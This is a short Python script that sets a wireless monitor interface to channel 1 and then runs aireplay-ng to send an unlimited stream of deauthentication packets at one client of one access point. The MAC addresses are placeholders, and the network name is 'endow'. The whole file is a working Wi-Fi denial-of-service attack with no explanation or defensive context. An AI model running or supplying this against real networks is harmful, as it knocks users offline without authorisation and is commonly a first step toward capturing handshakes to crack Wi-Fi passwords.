import os

os.system("iwconfig mon0 channel 1")
os.system("aireplay-ng -0 0 -a APMAC -c TARGETCLIENTMAC -e endow mon0") 

